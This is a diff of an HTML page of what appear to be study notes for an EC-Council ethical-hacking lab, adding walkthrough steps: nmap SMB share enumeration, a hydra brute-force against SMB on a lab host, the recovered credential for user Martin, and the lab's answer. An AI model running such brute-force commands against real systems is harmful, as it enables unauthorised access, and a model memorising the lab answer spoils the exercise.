@@ -454,5 +454,13 @@ docker run -d -p 443:443 --name openvas mikesplain/openvas</p>
     <p><ol>
         <ul>nmap --script smb-enum-shares -p445 192.168.10.101</ul>
         <ul>\\192.168.10.101\IPC$ has <b>Anonymous access: READ</b></ul>
-        <ul>We must do something with this information</ul>
+        <ul>cd /home/attacker/Desktop</ul>
+        <ul>Brute force: <b>hydra -L username.txt -P password.txt 192.168.10.101 smb</b></ul>
+        <ul>We find the credentials for <b>Martin</b>: <b>qwerty1234</b></ul>
+        <ul>Using EH Workstation 1 (Windows) I put this command in the Windows Explorer: \\192.168.10.101</ul>
+        <ul>Enter the username Martin and password qwerty1234 and we have access to the files</ul>
+        <ul>In folder \Martin\Music we find the file webpent.txt</ul>
+        <ul>www.moviescope.com is highlighted</ul>
+        <ul>We visit the website www.moviescope.com and look at the source</ul>
+        <ul>Answer to this question: Meta author is EC-Council</ul>
     </ol></p>
